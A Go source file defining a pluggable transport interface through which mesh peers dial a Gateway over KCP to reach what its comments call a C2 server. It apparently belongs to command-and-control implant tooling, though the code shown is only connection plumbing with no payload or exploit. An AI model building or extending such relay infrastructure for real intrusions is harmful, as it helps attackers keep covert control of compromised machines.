package mesh

// transport.go — pluggable transport interface for mesh peer connections.
//
// MeshTransport abstracts the dial mechanism for connecting to a Gateway.
// The default implementation is KCPTransport which uses bridge.go's DialGateway
// (KCP + CONNECT_C2 opcode → transparent pipe to C2 TLS).
// Future implementations could wrap QUIC, TCP, etc.

import (
	"context"
	"net"
)

// MeshTransport is the interface for dialling a mesh Gateway peer.
// Dial should return a net.Conn representing a transparent pipe to the C2 server.
type MeshTransport interface {
	Dial(ctx context.Context, peerIP, kcpPort string) (net.Conn, error)
	Ping(ctx context.Context, peerIP, kcpPort string) error
}

// RegistryTransport uses the transport registry to connect.
type RegistryTransport struct{}

func (RegistryTransport) Dial(ctx context.Context, peerIP, kcpPort string) (net.Conn, error) {
	return DialGateway(ctx, peerIP, OpcodeConnectC2)
}

func (RegistryTransport) Ping(ctx context.Context, peerIP, kcpPort string) error {
	conn, err := DialGateway(ctx, peerIP, OpcodePing)
	if err != nil {
		return err
	}
	conn.Close()
	return nil
}
